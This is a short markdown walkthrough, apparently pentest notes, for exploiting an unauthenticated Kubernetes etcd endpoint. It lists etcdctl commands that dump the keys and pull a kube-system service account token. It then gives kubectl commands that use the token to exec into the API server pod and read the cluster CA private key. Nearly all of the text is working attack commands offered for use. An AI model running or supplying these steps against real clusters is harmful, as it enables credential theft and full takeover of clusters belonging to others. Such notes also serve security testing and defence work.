## Unauthenticated ETCD

1. Exploiting this takes a couple of steps
2. Set the ETCD environment variable `export ETCDCTL_API=3`
3. First we need to dump some secrets out of the etcd database 
  `etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[CLUSTERIP]:2379 get / --prefix --keys-only`
4. Then we'll need a service account token to authenticate to the cluster with
  `etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://[IP]:2379 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-[RAND]`
  The service account token starts with ey and ends just before the word `kubernetes.io` in the token.  
5. To use the command line we'll need `bash` as the `ash` in the alpine Linux container doesn't like long commandlines
   `apk update && apk add bash`
   `bash`
6. With the service token we can use kubectl , first get the API pod name
  `kubectl --insecure-skip-tls-verify -shttps://[IP]:6443/ --token="[TOKEN]" -n kube-system get po`

6. Then get the key   
  `kubectl --insecure-skip-tls-verify -shttps://[IP]:6443/ --token="[TOKEN]" -n kube-system exec [API_SERVER_POD] cat /etc/kubernetes/pki/ca.key`